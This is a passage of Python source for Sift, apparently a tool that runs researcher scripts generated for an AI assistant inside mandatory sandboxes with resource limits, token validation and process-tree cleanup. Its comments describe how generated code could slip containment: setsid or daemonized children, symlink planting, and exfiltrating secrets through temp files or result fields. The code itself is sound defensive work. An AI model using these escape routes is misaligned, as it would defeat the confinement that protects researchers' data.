            f"on this system (platform {platform_name!r}) — Sift "
            "refuses to run scripts unsandboxed. This requires "
            "Windows 8 or later."
        )
    return (
        f"no supported sandbox backend for platform {platform_name!r} "
        "— Sift refuses to run scripts unsandboxed. macOS "
        "(sandbox-exec), Linux (bubblewrap), and Windows "
        "(AppContainer) are the supported backends in this Sift version."
    )


def run_script(
    language: Language,
    code: str,
    cwd: Path,
    *,
    env: Environment | None = None,
    timeout_seconds: int = DEFAULT_TIMEOUT_SECONDS,
    proc_register: "Callable[[Any], None] | None" = None,
) -> ExecutionResult:
    """Stage + run + capture the researcher's script.

    Never raises for normal failure modes (interpreter missing, timeout,
    non-zero exit, bad result file). Those show up as ``ok=False`` with
    ``error`` populated so the calling tool can return a policy-shaped
    response to Claude. Programmer errors (invalid ``language``, etc.)
    still raise ``ValueError``.
    """
    env = env or cached_environment()
    if language not in ("R", "Stata", "Python"):
        raise ValueError(
            f"unsupported language {language!r}; must be R, Stata, or Python"
        )

    # Build the environment metadata snapshot once per run. Attached
    # to every ExecutionResult below — success, failure, and every
    # preflight short-circuit — so the model gets the same shape on
    # every response and can rely on it for diagnosis without
    # branching on status. Phase-safe by construction: none of these
    # fields touch researcher data.
    env_metadata = _build_environment_metadata(env, language)

    # Normalize the authorized workspace before deriving the private run
    # directory or writing the sandbox policy. macOS exposes several paths
    # through aliases (notably ``/var`` -> ``/private/var``); sandbox-exec
    # evaluates the kernel-canonical path, so authorizing the lexical alias
    # makes the child unable to read its own staged script. The same
    # normalization keeps symlinked researcher workspaces usable without
    # widening the allowlist beyond the directory they selected.
    lexical_cwd = Path(cwd).expanduser()
    try:
        cwd = lexical_cwd.resolve(strict=True)
    except (OSError, RuntimeError):
        return ExecutionResult(
            environment=env_metadata,
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=(
                "script was not started because the selected analysis "
                "workspace could not be resolved to an existing directory"
            ),
            run_dir=lexical_cwd / RUNS_SUBDIR, script_path=None,
            duration_seconds=0.0,
        )
    if not cwd.is_dir():
        return ExecutionResult(
            environment=env_metadata,
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=(
                "script was not started because the selected analysis "
                "workspace is not a directory"
            ),
            run_dir=cwd / RUNS_SUBDIR, script_path=None,
            duration_seconds=0.0,
        )

    # Check capacity before creating even the scratch directory.  Performing
    # this only after ``_make_run_dir`` left the exact low-disk condition this
    # guard is meant to diagnose able to escape as a raw mkdir OSError.
    disk_reserve_bytes = script_min_free_disk_bytes()
    disk_preflight_error = _disk_reserve_preflight_error(
        cwd, disk_reserve_bytes,
    )
    prospective_run_root = cwd / RUNS_SUBDIR
    if disk_preflight_error is not None:
        return ExecutionResult(
            environment=env_metadata,
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[], error=disk_preflight_error,
            run_dir=prospective_run_root, script_path=None,
            duration_seconds=0.0,
        )

    # The POSIX rlimit launcher is a required part of the execution boundary
    # whenever any kernel limit is enabled.  Check it before creating a run
    # directory so a minimal Linux installation without Bash cannot silently
    # lose CPU/single-file protection or leave an empty staged run behind.
    if not sys.platform.startswith("win"):
        try:
            _resource_limited_argv(["sift-resource-preflight"], sys.platform)
        except RuntimeError as exc:
            return ExecutionResult(
                environment=env_metadata,
                ok=False, language=language, raw_stdout="", raw_stderr="",
                exit_code=None, result_payloads=[], error=str(exc),
                run_dir=prospective_run_root, script_path=None,
                duration_seconds=0.0,
            )

    # 1. Scratch dir. A filesystem can become full or unavailable between the
    # capacity probe and mkdir, so keep the creation race in the same normal,
    # actionable failure contract instead of raising out of run_script.
    try:
        run_dir = _make_run_dir(cwd)
    except OSError as exc:
        reason = (
            "insufficient free disk space"
            if exc.errno == errno.ENOSPC
            else "a filesystem error"
        )
        return ExecutionResult(
            environment=env_metadata,
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=(
                "script was not started because Sift could not create its "
                f"private run workspace due to {reason}; verify that the "
                "analysis workspace is writable and has free space"
            ),
            run_dir=prospective_run_root, script_path=None,
            duration_seconds=0.0,
        )
    result_path = run_dir / "result.json"
    script_path: Path | None = None

    def _result(**kw: Any) -> ExecutionResult:
        """Construct an ExecutionResult with this run's env metadata
        already attached. Defined as a closure so every exit path
        from ``run_script`` picks up the same snapshot without
        repeating ``environment=env_metadata`` at every return site.
        """
        return ExecutionResult(environment=env_metadata, **kw)

    presence_error = _sandbox_presence_error(env)
    if presence_error is not None:
        return _result(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[], error=presence_error,
            run_dir=run_dir, script_path=None, duration_seconds=0.0,
        )

    interpreter_error = _interpreter_preflight_error(language, env)
    if interpreter_error is not None:
        return _result(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[], error=interpreter_error,
            run_dir=run_dir, script_path=None, duration_seconds=0.0,
        )

    # Preflight: a working confinement backend is required for THIS
    # platform. Sift refuses to run a script unsandboxed rather than
    # ever falling through to a plain subprocess — the sandbox is the
    # enforcement of the data-boundary story; without it, a malicious
    # or merely careless script has unrestricted local file access
    # and could smuggle file contents out through result fields the
    # sanitizer forwards.
    #
    # macOS uses ``sandbox-exec`` (SBPL profile, built below). Linux
    # uses ``bwrap`` (bubblewrap — namespace-based confinement, argv
    # built below). Any other platform (Windows, or a Linux box
    # without bubblewrap installed) has no supported backend in this
    # Sift version and refuses outright rather than guessing.
    _platform = sys.platform
    if _platform == "darwin":
        _backend_missing = env.sandbox_exec is None
        _backend_error = (
            "sandbox-exec not available on this system — Sift "
            "refuses to run scripts unsandboxed. This binary lives "
            "at /usr/bin/sandbox-exec and should always be present "
            "on macOS; if it's missing, something unusual has "
            "happened to this machine's base install."
        )
        if not _backend_missing:
            # Second gate, same discipline the win32 branch below
            # already applies: binary PRESENCE is not the same as
            # binary HEALTH. ``sift --doctor`` (``_sandbox_exec_report``)
            # has always distinguished "sandbox-exec missing" from
            # "sandbox-exec present but can't apply a minimal profile"
            # via ``sandbox_baseline_result`` — this preflight used to
            # only check the first gate, so a researcher could see
            # "sandbox: blocked, baseline check fails" from the
            # doctor and then still have a script submission attempt
            # (and fail more confusingly than the doctor's own
            # message) a real sandboxed run. Checking the SAME cached
            # baseline result here means the executor can never give
            # a worse or different answer than the doctor already
            # gave for the exact same question.
            from sift.env_detect import sandbox_baseline_result
            _baseline_ok, _baseline_err = sandbox_baseline_result()
            if not _baseline_ok:
                _backend_missing = True
                _backend_error = (
                    f"sandbox-exec at {env.sandbox_exec} cannot apply "
                    f"a minimal profile: {_baseline_err} Sift refuses "
                    f"to run scripts unsandboxed rather than trust a "
                    f"confinement layer that's already known to be "
                    f"broken — see ``sift --doctor`` for the full "
                    f"report and advice."
                )
    elif _platform.startswith("linux"):
        _backend_missing = env.bwrap is None
        _backend_error = (
            "bubblewrap (bwrap) not available on this system — Sift "
            "refuses to run scripts unsandboxed. Install it with your "
            "distribution's package manager (e.g. "
            "``apt install bubblewrap``, ``dnf install bubblewrap``, "
            "``pacman -S bubblewrap``) and re-launch Sift. bwrap is "
            "the Linux equivalent of macOS's sandbox-exec — Sift's "
            "confinement guarantees (no network, filesystem confined "
            "to the analysis workspace) depend on it being present."
        )
        if not _backend_missing:
            # Same second gate as the darwin branch above, mirrored
            # for bwrap's baseline check — see that branch's comment
            # for why this must not be skipped.
            from sift.env_detect import bwrap_baseline_result
            _baseline_ok, _baseline_err = bwrap_baseline_result()
            if not _baseline_ok:
                _backend_missing = True
                _backend_error = (
                    f"bwrap at {env.bwrap} cannot apply a minimal "
                    f"sandbox: {_baseline_err} Sift refuses to run "
                    f"scripts unsandboxed rather than trust a "
                    f"confinement layer that's already known to be "
                    f"broken — see ``sift --doctor`` for the full "
                    f"report and advice."
                )
    elif _platform.startswith("win"):
        # Windows AppContainer + Job Objects backend. Two
        # gates, not one: ``appcontainer_support`` is a cheap "does
        # the API surface even exist" check (Windows 8+); passing it
        # is NOT sufficient to trust the backend with a researcher's
        # script. The live, empirical health probe
        # (``env_detect.appcontainer_probe_result`` ->
        # ``win_appcontainer.probe_appcontainer_health``) has to
        # positively confirm — on THIS machine, right now — that a
        # denied file read and a denied network connect both actually
        # get denied from inside a throwaway AppContainer, because
        # platform-specific behavior cannot be established from API
        # presence alone. Skipping straight to "API exists, assume it
        # works" would create a silent confinement failure.
        if not env.appcontainer_support:
            _backend_missing = True
            _backend_error = (
                "Windows AppContainer sandbox support is not available "
                f"on this system (platform {_platform!r}) — Sift "
                "refuses to run scripts unsandboxed. This requires "
                "Windows 8 or later; if you're on a supported Windows "
                "version and seeing this, something unusual has "
                "happened to this machine's base install."
            )
        else:
            from sift.env_detect import appcontainer_probe_result
            _probe_ok, _probe_detail = appcontainer_probe_result()
            _backend_missing = not _probe_ok
            _backend_error = (
                "Windows AppContainer sandbox support is present but "
                "failed its startup health check (platform "
                f"{_platform!r}): {_probe_detail or '(no detail)'}. "
                "Sift refuses to run scripts unsandboxed rather than "
                "trust an unverified confinement boundary — see "
                "``sift --doctor`` for the full report."
            )
    else:
        _backend_missing = True
        _backend_error = (
            f"no supported sandbox backend for platform {_platform!r} "
            f"— Sift refuses to run scripts unsandboxed. macOS "
            f"(sandbox-exec), Linux (bubblewrap), and Windows "
            f"(AppContainer) are the supported backends in this Sift "
            f"version."
        )
    if _backend_missing:
        return _result(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=_backend_error,
            run_dir=run_dir, script_path=None, duration_seconds=0.0,
        )

    # 2. Stage runtime + script.
    lib_dir = _stage_runtime(run_dir, language)
    script_path = _write_script(run_dir, language, code)

    # 3. Compose the command + sandbox profile.
    extra_read_paths: tuple[str, ...] = ()
    if language == "R":
        cmd = _r_command(env.r.binary, lib_dir, script_path)  # type: ignore[union-attr]
        extra_read_paths = env.r.extra_read_paths  # type: ignore[union-attr]
    elif language == "Stata":
        cmd = _stata_command(env.stata.binary, lib_dir, script_path)  # type: ignore[union-attr]
        extra_read_paths = env.stata.extra_read_paths  # type: ignore[union-attr]
    else:  # Python
        cmd = _python_command(env.python.binary, script_path)  # type: ignore[union-attr]
        # Allow the interpreter to read its own stdlib + site-packages
        # — critical for venv / pyenv / conda Pythons that live
        # outside the system trees the default sandbox already covers.
        # Plus the Sift-managed package dir, where ``install_packages``
        # writes pip ``--target`` payloads — without this read grant,
        # script imports of Sift-installed packages would deny at the
        # sandbox layer even though the import path entry resolves.
        from sift.package_installer import sift_python_pkg_dir
        pkg_dir = sift_python_pkg_dir(env.python.binary)  # type: ignore[union-attr]
        extra_read_paths = (
            *env.python.extra_read_paths,  # type: ignore[union-attr]
            str(pkg_dir),
        )

    # Backend presence is enforced above as a precondition, per
    # platform. macOS/Linux confine via an external wrapper binary
    # prepended to argv, built here. Windows has no such wrapper —
    # its confinement (AppContainer token + per-run ACL grants) is
    # applied by ``win_appcontainer.AppContainerRun`` around the
    # ``CreateProcess`` call itself (see the spawn site below), so
    # ``cmd`` is left as the bare interpreter invocation on that
    # platform.
    if _platform == "darwin":
        profile_path = _write_sandbox_profile(
            run_dir, cwd, extra_read_paths=extra_read_paths
        )
        cmd = [env.sandbox_exec, "-f", str(profile_path), *cmd]  # type: ignore[list-item]
    elif _platform.startswith("linux"):
        bwrap_args = _bwrap_argv(
            run_dir, cwd, Path.home(), extra_read_paths=extra_read_paths,
        )
        cmd = [env.bwrap, *bwrap_args, *cmd]  # type: ignore[list-item]
    # else: win32 — cmd stays bare; see above.

    # Apply POSIX resource limits without ``preexec_fn``. The fixed wrapper
    # runs outside and then execs into the sandbox command, so the limits are
    # inherited by the complete sandboxed process tree.
    if not _platform.startswith("win"):
        cmd = _resource_limited_argv(cmd, _platform)

    # 4. Run.
    # Subprocess cwd is language-specific:
    #   - R: the researcher's project dir, so `read.csv("survey.csv")`
    #     resolves naturally against relative paths.
    #   - Stata: the scratch dir, so Stata's batch-mode .log file lands
    #     there instead of in the researcher's project. The Stata wrapper
    #     `cd`s to the researcher's cwd before running the user's code,
    #     so relative paths in the user script still work.
    #   - Python: the researcher's project dir (same as R) — relative
    #     paths in ``pd.read_csv("survey.csv")`` resolve naturally.
    subprocess_cwd = run_dir if language == "Stata" else cwd
    # Generate a fresh per-run token. The runtime library reads it from
    # SIFT_RUN_TOKEN, embeds it in every emitted payload, and (in R)
    # unsets the env var so user code loaded afterward can't read it
    # directly. See ``_validate_and_strip_token`` below.
    run_token = _generate_run_token()
    process_tree_marker = secrets.token_urlsafe(24)
    # Per-run TMPDIR. Inheriting the user's session TMPDIR (typically
    # /var/folders/<hash>/T/) re-opens reads onto every other app's
    # scratch files for the same user — Slack, Cursor, Chrome cache,
    # etc. The sandbox previously allowed those whole trees too, so
    # a script could grep them for cookies, session tokens, draft
    # documents and smuggle excerpts through any surviving channel.
    # Pin the script to a fresh per-run dir under run_dir/tmp; the
    # sandbox profile (built below) narrows file-read*/file-write*
    # to that path instead of the broad system temp roots.
    per_run_tmp = run_dir / "tmp"
    per_run_tmp.mkdir(exist_ok=True)
    # Build the subprocess env from an explicit allowlist, not
    # ``{**os.environ}``. See _SUBPROCESS_ENV_ALLOWLIST above for
    # the rationale. Sift-specific vars are set last so a
    # pathological entry in the parent env can't shadow them.
    subprocess_env = {
        **_filter_env(dict(os.environ)),
        "SIFT_RESULT_PATH": str(result_path),
        "SIFT_LIB_DIR": str(lib_dir),
        "SIFT_CWD": str(cwd),
        # Override the inherited TMPDIR / TMP / TEMP / STATATMP so
        # R / Stata / Python's tempfile module land scratch files
        # under run_dir/tmp/ — covered by the run_dir allow rather
        # than the broad system temp roots.
        "TMPDIR": str(per_run_tmp),
        "TMP": str(per_run_tmp),
        "TEMP": str(per_run_tmp),
        "STATATMP": str(per_run_tmp),
        RUN_TOKEN_ENV_VAR: run_token,
        _PROCESS_TREE_MARKER_ENV_VAR: process_tree_marker,
    }
    if language == "Python":
        # Polars' pure-Python CPUID guard cannot execute inside an emulated
        # x64 process when Windows reports the native ARM host architecture;
        # it therefore returns no flags and rejects even its compatibility
        # runtime before loading it. Windows 11's x64 emulator supplies the
        # instructions, and Polars explicitly supports this false-positive
        # override. Scope it to the exact Windows-ARM-host/x64-process case so
        # a genuinely incompatible native x64 CPU still fails closed.
        from sift.platform_support import windows_x64_emulation

        if windows_x64_emulation(
            platform_name=_platform,
            machine=platform.machine(),
            python_platform=sysconfig.get_platform(),
        ):
            subprocess_env["POLARS_SKIP_CPU_CHECK"] = "1"

    # Snapshot cwd top-level BEFORE the subprocess runs so the diff
    # downstream can identify exactly which top-level files this run
    # created or modified. The Files panel uses this to hide script-
    # produced clutter (``ggsave("p.png")``, ``write.csv("tmp.csv")``,
    # etc.) from the researcher's view — those files are already
    # represented in the result card.
    cwd_pre_snapshot = _snapshot_cwd_top_level(cwd)

    # Windows: build the AppContainer + Job Object confinement context
    # here (rather than an argv wrapper — see the comment above) so it
    # can be entered around the actual spawn below and unconditionally
    # exited (ACL revert, profile delete, job handle close) once this
    # run is done with it, whether that's after a clean exit or a
    # timeout kill. ``_AppContainerErrorCls`` stays the empty tuple
    # off-Windows, which makes ``except _AppContainerErrorCls`` below
    # a guaranteed no-op there — ``except ():`` is valid Python and
    # matches nothing.
    _appcontainer_ctx = None
    _AppContainerErrorCls: "type[Exception] | tuple[()]" = ()
    if _platform.startswith("win"):
        from sift.win_appcontainer import AppContainerError, AppContainerRun
        _AppContainerErrorCls = AppContainerError
        _appcontainer_ctx = AppContainerRun(
            cmd, subprocess_cwd, run_dir, subprocess_env,
            extra_read_paths=extra_read_paths,
            cpu_seconds=script_cpu_limit_seconds(),
            memory_bytes=script_memory_limit_bytes(),
            max_processes=script_process_limit(),
            max_file_size_bytes=script_file_size_limit_bytes(),
            min_free_disk_bytes=disk_reserve_bytes,
        )

    start = time.monotonic()
    # Popen + communicate (instead of subprocess.run) so the async
    # caller can register the proc handle and ``proc.kill()`` it
    # when the asyncio task is cancelled. Without this, pressing
    # Stop while a long Stata regression / R fit / Python pipeline
    # is mid-run only cancels the Python coroutine; the subprocess
    # keeps running to completion (or to ``timeout_seconds``). From
    # the researcher's seat that looks identical to "Stop did
    # nothing". ``AppContainerProcess`` (the win32 spawn path,
    # returned by ``_appcontainer_ctx.__enter__()``) implements the
    # same ``.pid`` / ``.communicate(timeout=)`` / ``.kill()`` /
    # ``.returncode`` surface as ``subprocess.Popen``, so everything
    # from here down is platform-agnostic.
    proc: Any
    try:
        if _appcontainer_ctx is not None:
            proc = _appcontainer_ctx.__enter__()
        else:
            proc = subprocess.Popen(
                cmd,
                cwd=str(subprocess_cwd),
                env=subprocess_env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                # A researcher's script can print non-UTF-8 bytes to
                # stdout/stderr (a locale-specific R/Stata message, a
                # file read back and echoed in its original encoding,
                # binary garbage from a bug in the researcher's own
                # code) -- with the default strict decoding,
                # ``proc.communicate()`` below would raise
                # UnicodeDecodeError from deep inside the subprocess
                # module, an unhandled exception with no relation to
                # anything this function's own except-clauses catch.
                # Every other place this codebase reads
                # subprocess/file text that could be non-UTF-8 already
                # uses ``errors="replace"`` (see e.g. this module's own
                # result-file and log readers) -- this was the one
                # live text-decoding Popen call that didn't.
                errors="replace",
                # New process group: ``proc.kill()`` only SIGKILLs the
                # direct child (the ``sandbox-exec`` wrapper, which
                # ``exec``s into the interpreter). Any subprocess the
                # user's script spawns — ``parallel::makeCluster`` /
                # ``mclapply`` workers in R, ``multiprocessing.Pool`` /
                # ``subprocess.Popen`` in Python, ``parallel ...`` blocks
                # in Stata — would be re-parented to init when the wrapper
                # dies and keep running, still able to append to
                # ``result.json``. ``start_new_session=True`` puts the
                # whole subtree in its own session+process group so
                # ``cancel_turn`` can `killpg` the lot. (Windows has no
                # equivalent concept here — the Job Object created by
                # ``AppContainerRun`` plays this role instead; see
                # ``AppContainerProcess.kill``.)
                start_new_session=True,
            )
    except FileNotFoundError as e:
        return _result(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=f"interpreter not found: {e}",
            run_dir=run_dir, script_path=script_path, duration_seconds=0.0,
        )
    except _AppContainerErrorCls as e:  # win32 only — see above
        # On macOS/Linux, ``subprocess.Popen`` raises a bare
        # ``FileNotFoundError`` when the interpreter binary
        # itself doesn't exist, which the branch above turns into a
        # friendly, actionable "interpreter not found" message. On
        # Windows the analogous failure — ``CreateProcessW`` unable
        # to find the target executable — surfaces as
        # ``AppContainerError`` from deep inside
        # ``spawn_in_appcontainer``, exactly like every OTHER
        # AppContainer/Job-Object/ACL failure. Without this check, a
        # Windows researcher whose interpreter vanished after the
        # startup doctor check ran (uninstalled, quarantined by
        # antivirus, a removable/network drive disconnected) saw
        # "please report this as a bug" instead of "install Python" —
        # actively wrong advice for a condition that has nothing to
        # do with Sift's sandbox and everything to do with the
        # interpreter being gone, the same condition the POSIX branch
        # above handles gracefully.
        missing_interpreter_check = getattr(e, "is_missing_interpreter", None)
        if callable(missing_interpreter_check) and missing_interpreter_check():
            return _result(
                ok=False, language=language, raw_stdout="", raw_stderr="",
                exit_code=None, result_payloads=[],
                error=f"interpreter not found: {e}",
                run_dir=run_dir, script_path=script_path, duration_seconds=0.0,
            )
        return _result(
            ok=False, language=language, raw_stdout="", raw_stderr="",
            exit_code=None, result_payloads=[],
            error=(
                "could not launch the sandboxed process under "
                f"AppContainer: {e}. This should have been caught by "
                "the startup health probe (sift --doctor) — please "
                "report this as a bug."
            ),
            run_dir=run_dir, script_path=script_path, duration_seconds=0.0,
        )
    # A launch process group is not a complete tree boundary: generated code
    # can call setsid()/setpgid() and leave it.  Attach an identity tracker
    # before publishing the handle to the runner, so Stop never observes an
    # untracked process.  The private run marker recovers a child which
    # detached and was reparented between ancestry snapshots.
    if not _platform.startswith("win"):
        attach_posix_descendant_tracker(
            proc,
            marker=(_PROCESS_TREE_MARKER_ENV_VAR, process_tree_marker),
        )
    if proc_register is not None:
        try:
            proc_register(proc)
        except Exception:  # noqa: BLE001 — register is advisory, never fatal
            pass

    def _kill_proc_tree() -> None:
        # Whole-process-group kill — ``start_new_session=True`` above
        # detaches the subprocess into its own session, so any
        # parallel/multiprocessing workers the user's script
        # spawned are reachable via ``killpg``. Otherwise they'd
        # outlive us and keep writing to ``result.json`` (timeout
        # path) or simply run unbounded against the researcher's
        # data forever (unexpected-exception path — see the
        # ``except Exception`` branch below, which calls this too).
        # Windows has no process-group concept here at all —
        # ``os.killpg``/``os.getpgid`` don't exist on that platform —
        # so ``AppContainerProcess.kill()`` (Job Object termination,
        # which reaches every process ever assigned to the job, not
        # just a direct child) is called instead.
        if _platform.startswith("win"):
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass
        else:
            # This reaches observed descendants which deliberately escaped
            # the process group and verifies birth identity before signalling.
            # It is also idempotent when Stop and timeout race each other.
            if terminate_tracked_process_tree(proc):
                return
            import signal as _signal
            try:
                os.killpg(os.getpgid(proc.pid), _signal.SIGKILL)
            except (ProcessLookupError, PermissionError, OSError):
                try:
                    proc.kill()
                except Exception:  # noqa: BLE001
                    pass

    try:
        if _platform.startswith("win"):
            stdout, stderr = proc.communicate(timeout=timeout_seconds)
        else:
            stdout, stderr = _communicate_with_memory_guard(
                proc,
                timeout_seconds=timeout_seconds,
                memory_limit_bytes=script_memory_limit_bytes(),
                process_limit=script_process_limit(),
                cpu_limit_seconds=script_cpu_limit_seconds(),
                disk_directory=cwd,
                disk_reserve_bytes=disk_reserve_bytes,
            )
    except (
        subprocess.TimeoutExpired,
        _MemoryLimitExceeded,
        _ProcessLimitExceeded,
        _CpuLimitExceeded,
        _DiskReserveExceeded,
        _ResourceMonitorUnavailable,
    ) as stop_reason:
        # Same recovery as ``subprocess.run`` does: kill, drain,
        # report partial output. Without the second communicate(),
        # the .stdout/.stderr buffers stay attached to the killed
        # proc and the file descriptors leak into the run dir's
        # parent process.
        _kill_proc_tree()
        try:
            drained_stdout, drained_stderr = proc.communicate(timeout=2)
        except subprocess.TimeoutExpired:
            drained_stdout, drained_stderr = "", ""
        stdout = _merge_bounded_capture(
            getattr(
                stop_reason,
                "_sift_captured_stdout",
                getattr(stop_reason, "stdout", None),
            ),
            bool(getattr(stop_reason, "_sift_stdout_truncated", False)),
            drained_stdout,
        )
        stderr = _merge_bounded_capture(
            getattr(
                stop_reason,
                "_sift_captured_stderr",
                getattr(stop_reason, "stderr", None),
            ),
            bool(getattr(stop_reason, "_sift_stderr_truncated", False)),
            drained_stderr,
        )
        # Guaranteed teardown of the AppContainer profile / ACL
        # grants / Job Object handle — see ``AppContainerRun``'s
        # docstring on why this must run even (especially) on the
        # timeout path.
        cleanup_error: Exception | None = None
        if _appcontainer_ctx is not None:
            try:
                _appcontainer_ctx.__exit__(None, None, None)
            except Exception as exc:  # cleanup failure changes trust state
                cleanup_error = exc
        duration = time.monotonic() - start
        # Tag any cwd files this run created before the timeout —
        # a script that wrote a half-finished dataset before getting
        # killed still produced clutter the panel should hide.
        _write_cwd_writes_manifest(cwd, run_dir, cwd_pre_snapshot)
        # Register the token even on timeout: the helper library may
        # have written valid token-bearing manifest entries before
        # the kill, and the runner's re-validation needs the token
        # to recognize them. Without this, every timed-out run drops
        # all its plots — including ones the helper library wrote
        # legitimately seconds before the kill.
        register_run_token(run_dir, run_token)
        # Even on timeout the buffer-split files may exist on disk:
        # the preamble could have completed and user code been
        # writing to phase B when the kill landed. Read them so the
        # SDC posture stays consistent with the normal-exit path.
        timeout_pre, timeout_user, timeout_raw = _split_stderr_buffers(
            language, stderr or "", run_dir,
        )
        if isinstance(stop_reason, _MemoryLimitExceeded):
            timeout_error = (
                "script exceeded the process-tree memory limit of "
                f"{stop_reason.limit_bytes} bytes "
                f"(observed at least {stop_reason.observed_bytes} bytes)"
            )
        elif isinstance(stop_reason, _ProcessLimitExceeded):
            timeout_error = (
                "script exceeded the process-tree limit of "
                f"{stop_reason.limit_processes} processes "
                f"(observed at least {stop_reason.observed_processes})"
            )
        elif isinstance(stop_reason, _CpuLimitExceeded):
            timeout_error = (
                "script exceeded the aggregate process-tree CPU limit of "
                f"{stop_reason.limit_seconds:g} seconds "
                f"(observed at least {stop_reason.observed_seconds:.3f} seconds)"
            )
        elif isinstance(stop_reason, _DiskReserveExceeded):
            timeout_error = (
                "script stopped because available space on the analysis "
                "workspace filesystem fell below Sift's configured "
                f"{stop_reason.reserve_bytes}-byte safety reserve "
                f"(observed {stop_reason.observed_free_bytes} free bytes). "
                "Free disk space, move the workspace to a filesystem with "
                "more capacity, or deliberately adjust "
                "SIFT_SCRIPT_MIN_FREE_DISK_BYTES"
            )
        elif isinstance(stop_reason, _ResourceMonitorUnavailable):
            timeout_error = (
                f"script stopped because the {stop_reason.resource_name} "
                "process-tree safety monitor is unavailable; Sift refuses "
                "to run with an enabled resource guard it cannot enforce"
            )
        else:
            timeout_error = f"script timed out after {timeout_seconds}s"
        if cleanup_error is not None:
            timeout_error += (
                f"; Windows sandbox cleanup also failed: {cleanup_error}"
            )
        return _result(
            ok=False, language=language,
            raw_stdout=stdout or "",
            raw_stderr=timeout_raw,
            pre_user_stderr=timeout_pre,
            user_stderr=timeout_user,
            exit_code=None, result_payloads=[],
            error=timeout_error,
            run_dir=run_dir, script_path=script_path,
            duration_seconds=duration,
        )
    except Exception as communicate_error:
        # AppContainerRun's own docstring promises unconditional
        # teardown "on exit — success, exception, or timeout" (ACL
        # reverts, AppContainer profile deletion, Job Object handle
        # close). Before an earlier fix, that promise was only
        # actually honored from two places: the TimeoutExpired branch
        # above and the normal-completion path below. Anything else
        # raised inside ``proc.communicate()`` — an OSError from a
        # Windows API call failing unexpectedly (ReadFile /
        # WaitForSingleObject in AppContainerProcess.communicate), a
        # MemoryError, any bug — would propagate straight out of
        # run_script without ever running cleanup, leaking the ACL
        # grants and AppContainer profile for the run's (UUID-suffixed,
        # never-reused) SID. ``AppContainerProcess.close()`` is
        # explicitly idempotent (see its own docstring) specifically
        # so it can be called from every possible exit path without
        # needing to track whether an earlier path already ran it.
        #
        # That earlier fix stopped the AppContainer-resource leak but
        # left a second, POSIX-specific one: it never killed ``proc``
        # itself. On Windows the Job Object's
        # ``JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`` flag makes closing
        # the job handle (inside ``_appcontainer_ctx.__exit__``)
        # unconditionally terminate every process in it, so the
        # subprocess was already reaped there. POSIX has no such
        # automatic teardown tied to a context-manager exit — without
        # an explicit kill here, an unexpected (non-timeout)
        # exception out of ``communicate()`` orphans the running
        # interpreter (and any process-group children it spawned via
        # ``parallel::makeCluster`` / ``multiprocessing.Pool``): it
        # keeps executing against the researcher's data, unbounded,
        # until it exits on its own. Kill the tree the same way the
        # timeout path does, on every platform, before tearing down
        # the AppContainer context and re-raising.
        _kill_proc_tree()
        if _appcontainer_ctx is not None:
            try:
                _appcontainer_ctx.__exit__(None, None, None)
            except Exception as cleanup_error:
                raise cleanup_error from communicate_error
        raise

    duration = time.monotonic() - start
    exit_code = proc.returncode
    # Natural interpreter exit is not proof that its descendants exited.  A
    # generated script can daemonize a setsid child and return zero, so apply
    # the same identity-safe cleanup on normal completion too.
    if not _platform.startswith("win"):
        terminate_tracked_process_tree(proc)
    # Guaranteed teardown of the AppContainer profile / ACL grants /
    # Job Object handle on the normal-completion path — the mirror of
    # the timeout-path teardown above. Safe to call exactly once;
    # ``AppContainerProcess.close()`` (which this ultimately invokes)
    # is itself idempotent.
    if _appcontainer_ctx is not None:
        try:
            _appcontainer_ctx.__exit__(None, None, None)
        except Exception as cleanup_error:
            return _result(
                ok=False,
                language=language,
                raw_stdout=stdout or "",
                raw_stderr=stderr or "",
                exit_code=exit_code,
                result_payloads=[],
                error=(
                    "Windows sandbox cleanup failed after the script exited; "
                    f"results are withheld because containment state cannot be "
                    f"trusted: {cleanup_error}"
                ),
                run_dir=run_dir,
                script_path=script_path,
                duration_seconds=duration,
            )
    # Tag cwd files this run created or modified. Runs after the
    # subprocess has fully finished writing; before any consumer
    # (Files panel) reads the manifest.
    _write_cwd_writes_manifest(cwd, run_dir, cwd_pre_snapshot)

    # 5. Collect output. For Stata batch mode, real output lives in a
    # .log file next to the .do script rather than stdout.
    raw_stdout = stdout or ""
    pipe_stderr = stderr or ""
    if language == "Stata":
        log_contents = _read_stata_log(script_path)
        if log_contents:
            raw_stdout = log_contents + (("\n" + raw_stdout) if raw_stdout else "")

    pre_user_stderr, user_stderr, raw_stderr = _split_stderr_buffers(
        language, pipe_stderr, run_dir,
    )

    # Persist the raw subprocess output to the run dir so the researcher
    # TUI (and, if needed, later audit) can display what R / Stata / Python
    # actually said. The raw .log files NEVER cross to the model; there
    # is no file-read tool. The model can see a *short debug excerpt* on
    # script failure (see ``error_summary.extract_debug_excerpt``), which
    # is anchored on each language's error idiom, capped at 1 KB, and
    # passes through credential scrub plus path normalisation plus
    # dumpy-blob truncation. See ``test_error_summary_no_leak.py`` for
    # the SDC boundary regressions, and ``test_stderr_isolation.py`` for
    # the broader "no raw log file ever crosses" pin.
    # No-follow writes: stdout.log / stderr.log land in run_dir
    # which is script-writable, and the host runs unsandboxed.
    # A script can plant a symlink at either path before exiting,
    # so the host's write follows the link and overwrites
    # attacker-chosen files. The helper refuses to follow;
    # persistence failure isn't fatal — raw output still lives
    # in the ExecutionResult fields for in-process rendering.
    _write_text_no_follow(run_dir / "stdout.log", raw_stdout)
    _write_text_no_follow(run_dir / "stderr.log", raw_stderr)

    # 6. Parse result file. The runtime libraries write JSONL (one
    # payload per line). A script that calls a single helper produces
    # one line; one that calls N helpers produces N lines, in
    # emission order. Each line is independently token-validated.
    #
    # Partial-success surface: when a script aborts mid-loop after
